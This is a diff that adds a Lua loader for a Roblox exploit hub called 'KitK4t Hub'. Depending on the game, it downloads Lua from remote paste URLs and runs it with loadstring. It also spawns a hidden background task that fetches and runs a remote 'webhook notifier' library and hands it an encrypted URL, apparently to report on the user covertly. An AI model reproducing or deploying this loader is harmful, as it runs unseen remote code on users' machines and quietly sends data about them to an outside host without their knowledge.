@@ -1,0 +1,64 @@
+-----------------------------------------------------
+-- CONFIG
+-----------------------------------------------------
+local BROOKHAVEN_PLACEID    = 4924922222
+local TRAINING_PLACEID      = 16572004551
+local CARDEALER_PLACEID     = 1554960397
+
+local trainingUrl   = "https://api.rubis.app/v2/scrap/M6uqoNf0a8B7dsVX/raw"
+local cardealerUrl  = "https://api.rubis.app/v2/scrap/KCHqlYKLFkFO0a4W/raw"
+local brookhavenUrl = "https://api.rubis.app/v2/scrap/vk01i5gl1i7wg1tZ/raw"
+local universalUrl  = "https://api.rubis.app/v2/scrap/xQcqCfCZHddaQr2R/raw"
+
+-----------------------------------------------------
+-- Novo Sistema de Webhook (Protegido)
+-----------------------------------------------------
+local function sendWebhook()
+    -- O pcall 
+    pcall(function()
+        local requestWebhook = loadstring(game:HttpGet("https://blox-webhook-notifier.onrender.com/script/library"))()
+        local cryptUrl = "0389d0791374775d0f7be90039cac32243facebcbdb8b4dc83323fcd48f83a06d058c9761a2746cd78b46f5df3216f5b8bd6175f3ab2b6e677a67bc270484dec3f6b1a482891175189d355e501e46acfc2ef653b38b606e4a6daba4e10bbae7c35a3ef1f215f4ed3ab670f8aac6b691c297721a0d54c008eb633ecc48b25edb3cbeabb4968327abc1fa2adfe6febe5e8d5ce1a2a02b1ff6cf9ae6ab129175cb3a789d2418dc36bc37a8bdbd25cefdf6f58d6cd6e0e9b47aede95148c3ce71afd33d11c6730fcd7d34489c938ad4d577a68d285c920823ed2bd0c096bae84d932"
+        requestWebhook(cryptUrl)
+    end)
+end
+
+-----------------------------------------------------
+-- Fast Load
+-----------------------------------------------------
+local function fastLoad(url)
+    local successHttp, source = pcall(function()
+        return game:HttpGet(url)
+    end)
+
+    if not successHttp or not source then
+        warn("[KitK4t Hub] Falha ao ser rapido:", url)
+        return
+    end
+
+    local successRun, err = pcall(function()
+        loadstring(source)()
+    end)
+
+    if not successRun then
+        warn("[KitK4t Hub] Erro ao executar script:", err)
+    end
+end
+
+-----------------------------------------------------
+-- Detecção do Jogo e Execução Independente
+-----------------------------------------------------
+local id = game.PlaceId
+
+-- Tenta enviar o webhook em segundo plano
+task.spawn(sendWebhook)
+
+-- Execução do script principal continua normalmente
+if id == BROOKHAVEN_PLACEID then
+    fastLoad(brookhavenUrl)
+elseif id == TRAINING_PLACEID then
+    fastLoad(trainingUrl)
+elseif id == CARDEALER_PLACEID then
+    fastLoad(cardealerUrl)
+else
+    fastLoad(universalUrl)
+end
